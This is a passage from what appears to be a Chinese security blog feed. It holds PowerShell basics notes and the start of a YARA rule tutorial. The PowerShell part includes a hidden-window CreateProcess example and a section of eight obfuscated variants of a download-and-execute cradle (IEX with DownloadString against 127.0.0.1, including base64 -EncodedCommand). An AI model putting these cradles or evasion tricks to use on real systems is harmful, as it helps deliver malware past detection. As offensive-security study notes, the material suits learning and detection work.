<h4 id="0x04-è¿ç®—ç¬¦"><a href="#0x04-è¿ç®—ç¬¦" class="headerlink" title="0x04  è¿ç®—ç¬¦"></a>0x04  è¿ç®—ç¬¦</h4><h5 id="æ¯”è¾ƒè¿ç®—ç¬¦"><a href="#æ¯”è¾ƒè¿ç®—ç¬¦" class="headerlink" title="æ¯”è¾ƒè¿ç®—ç¬¦"></a>æ¯”è¾ƒè¿ç®—ç¬¦</h5><ul>
<li>-eq        ç­‰äº</li>
<li>-ne        ä¸ç­‰äº</li>
<li>-gt        å¤§äº</li>
<li>-ge        å¤§äºç­‰äº</li>
<li>-lt        å°äº</li>
<li>-le        å°äºç­‰äº</li>
</ul>
<h5 id="åŒ¹é…è¿ç®—ç¬¦"><a href="#åŒ¹é…è¿ç®—ç¬¦" class="headerlink" title="åŒ¹é…è¿ç®—ç¬¦"></a>åŒ¹é…è¿ç®—ç¬¦</h5><ul>
<li>-like</li>
<li>-notlike</li>
<li>-match</li>
<li>-notmatch</li>
</ul>
<h5 id="åŒ…å«è¿ç®—ç¬¦"><a href="#åŒ…å«è¿ç®—ç¬¦" class="headerlink" title="åŒ…å«è¿ç®—ç¬¦"></a>åŒ…å«è¿ç®—ç¬¦</h5><ul>
<li>-contains</li>
<li>-nocontains</li>
<li>-match</li>
<li>-notmatch</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;abc&quot;</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;a*&quot;</span></span><br><span class="line"><span class="variable">$c</span> = <span class="string">&quot;a??&quot;</span></span><br><span class="line"><span class="variable">$a</span> <span class="operator">-like</span> <span class="variable">$b</span></span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"><span class="variable">$a</span> <span class="operator">-like</span> <span class="variable">$c</span></span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">1</span></span><br><span class="line"><span class="variable">$a</span> <span class="operator">-contains</span> <span class="variable">$b</span></span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"><span class="variable">$b</span> <span class="operator">-contains</span> <span class="variable">$a</span></span><br><span class="line"><span class="comment"># False</span></span><br></pre></td></tr></table></figure>

<h4 id="0x05-æ§åˆ¶æµç¨‹"><a href="#0x05-æ§åˆ¶æµç¨‹" class="headerlink" title="0x05 æ§åˆ¶æµç¨‹"></a>0x05 æ§åˆ¶æµç¨‹</h4><h5 id="é€‰æ‹©"><a href="#é€‰æ‹©" class="headerlink" title="é€‰æ‹©"></a>é€‰æ‹©</h5><ul>
<li>if else</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> <span class="operator">-eq</span> <span class="variable">$b</span>)&#123;</span><br><span class="line">  <span class="built_in">write-host</span> <span class="string">&quot;aaa&quot;</span> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$a</span> <span class="operator">-gt</span> <span class="variable">$b</span>)&#123;</span><br><span class="line">  <span class="built_in">write-host</span> <span class="string">&quot;bbb&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">write-host</span> <span class="string">&quot;ccc&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ccc</span></span><br></pre></td></tr></table></figure>

<ul>
<li>switch</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$day</span>=<span class="number">5</span></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$day</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">1</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;ä»Šå¤©æ˜¯æ˜ŸæœŸä¸€&quot;</span>&#125;</span><br><span class="line">  <span class="number">2</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;ä»Šå¤©æ˜¯æ˜ŸæœŸäºŒ&quot;</span>&#125;</span><br><span class="line">  <span class="number">3</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;ä»Šå¤©æ˜¯æ˜ŸæœŸä¸‰&quot;</span>&#125;</span><br><span class="line">  <span class="number">4</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;ä»Šå¤©æ˜¯æ˜ŸæœŸå››&quot;</span>&#125;</span><br><span class="line">  <span class="number">5</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;ä»Šå¤©æ˜¯æ˜ŸæœŸäº”&quot;</span>&#125;</span><br><span class="line">  <span class="number">6</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;ä»Šå¤©æ˜¯æ˜ŸæœŸå…­&quot;</span>&#125;</span><br><span class="line">  <span class="number">7</span>&#123;<span class="built_in">echo</span> <span class="string">&quot;ä»Šå¤©æ˜¯æ˜ŸæœŸæ—¥&quot;</span>&#125;</span><br><span class="line">  default&#123;<span class="built_in">echo</span> <span class="string">&quot;è¯·è¾“å…¥1-7&quot;</span>&#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment"># ä»Šå¤©æ˜¯æ˜ŸæœŸäº”</span></span><br></pre></td></tr></table></figure>

<br>

<h5 id="å¾ªç¯"><a href="#å¾ªç¯" class="headerlink" title="å¾ªç¯"></a>å¾ªç¯</h5><ul>
<li>for</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">10</span>; <span class="variable">$i</span>=<span class="variable">$i</span>+<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>foreach</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$i</span> <span class="keyword">in</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>while</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span> <span class="operator">-le</span> <span class="number">5</span>)&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">  <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>do while</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">  <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="variable">$i</span> <span class="operator">-le</span> <span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>continue</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span>=<span class="number">1</span> </span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span> <span class="operator">-le</span> <span class="number">5</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$i</span> <span class="operator">-eq</span> <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">  <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>break</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">5</span>; <span class="variable">$a</span>+=<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$i</span> <span class="operator">-eq</span> <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">  <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="0x06-å‡½æ•°"><a href="#0x06-å‡½æ•°" class="headerlink" title="0x06 å‡½æ•°"></a>0x06 å‡½æ•°</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span><span class="params">([int]<span class="variable">$x</span>)</span></span>&#123;</span><br><span class="line">  <span class="variable">$res</span> = <span class="variable">$x</span> * <span class="variable">$x</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$res</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$result</span> = func(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$result</span></span><br></pre></td></tr></table></figure>

<h4 id="0x07-Win32API"><a href="#0x07-Win32API" class="headerlink" title="0x07 Win32API"></a>0x07 Win32API</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªçº¿ç¨‹å¯åŠ¨calc </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-TypeDefinition</span> <span class="string">@&quot;    #å£°æ˜</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Diagnostics;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">[StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">public struct PROCESS_INFORMATION</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public IntPtr hProcess;</span></span><br><span class="line"><span class="string">public IntPtr hThread;</span></span><br><span class="line"><span class="string">public uint dwProcessId;</span></span><br><span class="line"><span class="string">public uint dwThreadId;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]</span></span><br><span class="line"><span class="string">public struct STARTUPINFO</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public uint cb;</span></span><br><span class="line"><span class="string">public string lpReserved;</span></span><br><span class="line"><span class="string">public string lpDesktop;</span></span><br><span class="line"><span class="string">public string lpTitle;</span></span><br><span class="line"><span class="string">public uint dwX;</span></span><br><span class="line"><span class="string">public uint dwY;</span></span><br><span class="line"><span class="string">public uint dwXSize;</span></span><br><span class="line"><span class="string">public uint dwYSize;</span></span><br><span class="line"><span class="string">public uint dwXCountChars;</span></span><br><span class="line"><span class="string">public uint dwYCountChars;</span></span><br><span class="line"><span class="string">public uint dwFillAttribute;</span></span><br><span class="line"><span class="string">public uint dwFlags;</span></span><br><span class="line"><span class="string">public short wShowWindow;</span></span><br><span class="line"><span class="string">public short cbReserved2;</span></span><br><span class="line"><span class="string">public IntPtr lpReserved2;</span></span><br><span class="line"><span class="string">public IntPtr hStdInput;</span></span><br><span class="line"><span class="string">public IntPtr hStdOutput;</span></span><br><span class="line"><span class="string">public IntPtr hStdError;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">[StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">public struct SECURITY_ATTRIBUTES</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public int length;</span></span><br><span class="line"><span class="string">public IntPtr lpSecurityDescriptor;</span></span><br><span class="line"><span class="string">public bool bInheritHandle;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">public static class Kernel32</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">[DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">public static extern bool CreateProcess(</span></span><br><span class="line"><span class="string">string lpApplicationName,</span></span><br><span class="line"><span class="string">string lpCommandLine,</span></span><br><span class="line"><span class="string">ref SECURITY_ATTRIBUTES lpProcessAttributes,</span></span><br><span class="line"><span class="string">ref SECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="line"><span class="string">bool bInheritHandles,</span></span><br><span class="line"><span class="string">uint dwCreationFlags,</span></span><br><span class="line"><span class="string">IntPtr lpEnvironment,</span></span><br><span class="line"><span class="string">string lpCurrentDirectory,</span></span><br><span class="line"><span class="string">ref STARTUPINFO lpStartupInfo,</span></span><br><span class="line"><span class="string">out PROCESS_INFORMATION lpProcessInformation);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># StartupInfo Struct</span></span><br><span class="line"><span class="variable">$StartupInfo</span> = <span class="built_in">New-Object</span> STARTUPINFO</span><br><span class="line"><span class="variable">$StartupInfo</span>.dwFlags = <span class="number">0</span>x00000001 <span class="comment"># STARTF_USESHOWWINDOW</span></span><br><span class="line"><span class="variable">$StartupInfo</span>.wShowWindow = <span class="number">0</span>x0000 <span class="comment"># SW_HIDE</span></span><br><span class="line"><span class="variable">$StartupInfo</span>.cb = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::SizeOf(<span class="variable">$StartupInfo</span>)</span><br><span class="line"><span class="comment"># Struct Size</span></span><br><span class="line"><span class="comment"># ProcessInfo Struct</span></span><br><span class="line"><span class="variable">$ProcessInfo</span> = <span class="built_in">New-Object</span> PROCESS_INFORMATION</span><br><span class="line"><span class="comment"># SECURITY_ATTRIBUTES Struct (Process &amp;amp; Thread)</span></span><br><span class="line"><span class="variable">$SecAttr</span> = <span class="built_in">New-Object</span> SECURITY_ATTRIBUTES</span><br><span class="line"><span class="variable">$SecAttr</span>.Length = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::SizeOf(<span class="variable">$SecAttr</span>)</span><br><span class="line"><span class="comment"># CreateProcess In CurrentDirectory</span></span><br><span class="line"><span class="variable">$GetCurrentPath</span> = (<span class="built_in">Get-Item</span> <span class="literal">-Path</span> <span class="string">&quot;.\&quot;</span> <span class="literal">-Verbose</span>).FullName</span><br><span class="line"><span class="comment"># Call CreateProcess</span></span><br><span class="line">[<span class="type">Kernel32</span>]::CreateProcess(<span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span>, <span class="string">&quot;/c calc.exe&quot;</span>, [<span class="type">ref</span>] <span class="variable">$SecAttr</span>, [<span class="type">ref</span>] <span class="variable">$SecAttr</span>, <span class="variable">$false</span>,</span><br><span class="line"><span class="number">0</span>x08000000, [<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero, <span class="variable">$GetCurrentPath</span>, [<span class="type">ref</span>] <span class="variable">$StartupInfo</span>, [<span class="type">ref</span>] <span class="variable">$ProcessInfo</span>) |<span class="built_in">out-null</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„Ÿè§‰ç”¨èµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œéœ€è¦å…ˆå»å£°æ˜ç»“æ„ä½“å•¥çš„ å†å»è°ƒç”¨</span></span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x08-æ–‡ä»¶ä¸‹è½½"><a href="#0x08-æ–‡ä»¶ä¸‹è½½" class="headerlink" title="0x08 æ–‡ä»¶ä¸‹è½½"></a>0x08 æ–‡ä»¶ä¸‹è½½</h4><p><code>invoke-webrequest -Uri $url -OutFile $output</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line"><span class="variable">$output</span> = <span class="string">&quot;F:\1.html&quot;</span></span><br><span class="line"><span class="built_in">invoke-webrequest</span> <span class="literal">-Uri</span> <span class="variable">$url</span> <span class="literal">-OutFile</span> <span class="variable">$output</span></span><br></pre></td></tr></table></figure>

<p><code>(New-Object System.Net.WebClient).DownloadFile($url,$output)</code> </p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line"><span class="variable">$output</span> = <span class="string">&quot;F:\2.html&quot;</span></span><br><span class="line">(<span class="built_in">New-Object</span> System.Net.WebClient).DownloadFile(<span class="variable">$url</span>,<span class="variable">$output</span>) </span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x09-æ–‡ä»¶æ“ä½œ"><a href="#0x09-æ–‡ä»¶æ“ä½œ" class="headerlink" title="0x09 æ–‡ä»¶æ“ä½œ"></a>0x09 æ–‡ä»¶æ“ä½œ</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ–°å»ºç›®å½•test</span></span><br><span class="line"><span class="built_in">New-Item</span> test <span class="literal">-ItemType</span> directory </span><br><span class="line"><span class="comment"># åˆ é™¤ç›®å½•test</span></span><br><span class="line"><span class="built_in">Remove-Item</span> test </span><br><span class="line"><span class="comment"># æ–°å»ºæ–‡ä»¶test.txt</span></span><br><span class="line"><span class="built_in">New-Item</span> test.txt <span class="literal">-ItemType</span> file </span><br><span class="line"><span class="comment"># æ–°å»ºæ–‡ä»¶test.txtï¼Œå†…å®¹ä¸º test</span></span><br><span class="line"><span class="built_in">New-Item</span> test.txt <span class="literal">-ItemType</span> file <span class="literal">-value</span> <span class="string">&quot;test&quot;</span> </span><br><span class="line"><span class="comment"># åˆ é™¤æ–‡ä»¶test.txt</span></span><br><span class="line"><span class="built_in">Remove-Item</span> test.txt </span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ–‡ä»¶test.txtå†…å®¹</span></span><br><span class="line"><span class="built_in">Get-Content</span> test.txt </span><br><span class="line"><span class="comment"># è®¾ç½®æ–‡ä»¶test.txtå†…å®¹t</span></span><br><span class="line"><span class="built_in">Set-Content</span> test.txt <span class="literal">-Value</span> <span class="string">&quot;test&quot;</span> </span><br><span class="line"><span class="comment"># ç»™æ–‡ä»¶test.txtè¿½åŠ å†…å®¹</span></span><br><span class="line"><span class="built_in">Add-Content</span> test.txt <span class="literal">-Value</span> <span class="string">&quot;,test2&quot;</span> </span><br><span class="line"><span class="comment"># æ¸…é™¤æ–‡ä»¶test.txtå†…å®¹</span></span><br><span class="line"><span class="built_in">Clear-Content</span> test.txt</span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x0a-ç®€å•æ··æ·†"><a href="#0x0a-ç®€å•æ··æ·†" class="headerlink" title="0x0a ç®€å•æ··æ·†"></a>0x0a ç®€å•æ··æ·†</h4><p><code>Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://127.0.0.1:8000/1.txt&quot;)</code></p>
<br>

<ul>
<li>1.å»æ‰Systemå…³é”®è¯</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://127.0.0.1:8000/1.txt&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>2.ä½¿ç”¨å­—ç¬¦ä¸²è¿æ¥+å·è¿æ¥</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>3.ä½¿ç”¨Invokeæ–¹æ³•</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).(<span class="string">&quot;DownloadString&quot;</span>).Invoke(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>4.å˜é‡æ›¿ä»£</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ds</span>=<span class="string">&quot;Down&quot;</span>+<span class="string">&quot;loadString&quot;</span>;</span><br><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="variable">$ds</span>.Invoke(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>5.å…³é”®è¯ä½¿ç”¨å•åŒå¼•å·å¼•èµ·æ¥</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="string">&quot;DownloadString&quot;</span>(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1/powershell&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>6.è½¬ä¹‰ç¬¦å·</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="string">&quot;D o wn l oad Str in g&quot;</span>(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>7.å­—ç¬¦ä¸²åè½¬</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$re</span>= <span class="string">&quot;)&#x27;txt.1/0008:1.0.0.721//:ptth&#x27;(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(&quot;</span>;</span><br><span class="line">(<span class="variable">$re</span>[-<span class="number">1</span><span class="type">..</span>-(<span class="variable">$re</span><span class="type">.Length</span>)] <span class="operator">-Join</span> <span class="string">&#x27;&#x27;</span>) | <span class="built_in">IEX</span></span><br></pre></td></tr></table></figure>

<ul>
<li>8.ç¼–ç æ‰§è¡Œ</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="string">&quot;Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;h&#x27;+&#x27;ttp://127.0.0.1:8000/1.txt&#x27;)&quot;</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$command</span>)</span><br><span class="line"><span class="variable">$encodedCommand</span> = [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line">powershell.exe <span class="literal">-EncodedCommand</span> <span class="variable">$encodedCommand</span></span><br></pre></td></tr></table></figure>

<h5 id="æ··æ·†å·¥å…·"><a href="#æ··æ·†å·¥å…·" class="headerlink" title="æ··æ·†å·¥å…·"></a>æ··æ·†å·¥å…·</h5><p> Invoke-Obfuscation</p>
<p><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
<p>Revoke-Obfuscation</p>
<br>

<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://gsh3ll.top/2021/12/18/%E3%80%90%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0%E3%80%91PowerShell%E5%9F%BA%E7%A1%80/</span><br><span class="line">https://cloud.tencent.com/developer/article/1639161</span><br><span class="line">https://www.secrss.com/articles/20119</span><br><span class="line">https://www.cnblogs.com/linuxsec/articles/7384582.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>Yaraè§„åˆ™å­¦ä¹ -01</title>
    <url>/posts/db5cae05/</url>
    <content><![CDATA[<h3 id="å®˜æ–¹demo"><a href="#å®˜æ–¹demo" class="headerlink" title="å®˜æ–¹demo"></a>å®˜æ–¹demo</h3><p><a href="https://github.com/VirusTotal/yara">https://github.com/VirusTotal/yara</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rule silent_banker : banker</span><br><span class="line">&#123;</span><br><span class="line">    meta:</span><br><span class="line">        description = &quot;This is just an example&quot;</span><br><span class="line">        threat_level = 3</span><br><span class="line">        in_the_wild = true</span><br><span class="line"></span><br><span class="line">    strings:</span><br><span class="line">        $a = &#123;6A 40 68 00 30 00 00 6A 14 8D 91&#125;</span><br><span class="line">        $b = &#123;8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9&#125;</span><br><span class="line">        $c = &quot;UVODFRYSIHLNWPEJXQZAKCBGMT&quot;   //æ ·æœ¬ä¸­å‡ºç°çš„æœºå™¨ç æˆ–è€…å­—ç¬¦ä¸²</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a or $b or $c          // æ»¡è¶³å…¶ä¸­ä¸€ä¸ªæ¡ä»¶å³å¯è¿›è¡ŒåŒ¹é…</span><br><span class="line">&#125;c</span><br></pre></td></tr></table></figure>

<br>

<h3 id="Yaraè§„åˆ™è¯­æ³•"><a href="#Yaraè§„åˆ™è¯­æ³•" class="headerlink" title="Yaraè§„åˆ™è¯­æ³•"></a>Yaraè§„åˆ™è¯­æ³•</h3><p>ä¸€èˆ¬åŒ…å«3éƒ¨åˆ†ï¼Œåˆ†åˆ«ä¸º meta  string condition</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rule RuleName</span><br><span class="line">&#123;</span><br><span class="line">    meta:           //è¯¥è§„åˆ™çš„åŸºç¡€ä¿¡æ¯</span><br><span class="line">    strings:        //ç”¨æ¥å®šä¹‰å­—ç¬¦ä¸²</span><br><span class="line">    condition:      //ç¼–å†™è¡¨è¾¾å¼å¤„ç†stringsä¸­çš„å­—ç¬¦ä¸²</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ruleå‘½åè§„åˆ™"><a href="#ruleå‘½åè§„åˆ™" class="headerlink" title="ruleå‘½åè§„åˆ™"></a>ruleå‘½åè§„åˆ™</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.è‹±æ–‡æˆ–å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²</span><br><span class="line">2.å¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿</span><br><span class="line">3.ç¬¬ä¸€ä¸ªå­—ç¬¦ç¦æ­¢ä¸ºæ•°å­—</span><br><span class="line">4.å¤§å°å†™æ•æ„Ÿ</span><br><span class="line">5.ä¸å¯ä»¥å¤§äº128ä¸ªå­—ç¬¦é•¿åº¦</span><br></pre></td></tr></table></figure>

<h4 id="Yaraè§„åˆ™æ”¯æŒå­—ç¬¦ä¸²ã€æ­£åˆ™è¡¨è¾¾å¼ã€åå…­è¿›åˆ¶è¿›è¡ŒåŒ¹é…ã€‚"><a href="#Yaraè§„åˆ™æ”¯æŒå­—ç¬¦ä¸²ã€æ­£åˆ™è¡¨è¾¾å¼ã€åå…­è¿›åˆ¶è¿›è¡ŒåŒ¹é…ã€‚" class="headerlink" title="Yaraè§„åˆ™æ”¯æŒå­—ç¬¦ä¸²ã€æ­£åˆ™è¡¨è¾¾å¼ã€åå…­è¿›åˆ¶è¿›è¡ŒåŒ¹é…ã€‚"></a>Yaraè§„åˆ™æ”¯æŒå­—ç¬¦ä¸²ã€æ­£åˆ™è¡¨è¾¾å¼ã€åå…­è¿›åˆ¶è¿›è¡ŒåŒ¹é…ã€‚</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å­—ç¬¦ä¸²ï¼šå®šä¹‰ä¸€ä¸ªå˜é‡ $a = â€œå­—ç¬¦ä¸²å†…å®¹â€</span><br><span class="line"></span><br><span class="line">æ­£åˆ™è¡¨è¾¾å¼ï¼šå®šä¹‰ä¸€ä¸ªå˜é‡ $a = /æ­£åˆ™è¡¨è¾¾å¼å†…å®¹/</span><br><span class="line"></span><br><span class="line">åå…­è¿›åˆ¶ï¼šå®šä¹‰ä¸€ä¸ªå˜é‡ $a = &#123;åå…­è¿›åˆ¶å†…å®¹&#125;     </span><br><span class="line">#å¯ä»¥ä½¿ç”¨ ï¼Ÿ ä½œä¸ºé€šé…ç¬¦</span><br><span class="line">$hex1 = &#123; EF E4 ?8 D8 ?? FB&#125;</span><br><span class="line">#ä¸å®šé•¿å­—ç¬¦ä¸²å¯ä»¥ç”¨ [3-5]è¡¨ç¤º æ— é™é•¿å¯ä»¥ç”¨[-]è¡¨ç¤º</span><br><span class="line">$hex2 = &#123; EF E4 [-] A2 FB&#125;</span><br><span class="line">$hex3 = &#123; EF E4 [2-4] D8 A2 FB&#125;</span><br></pre></td></tr></table></figure>

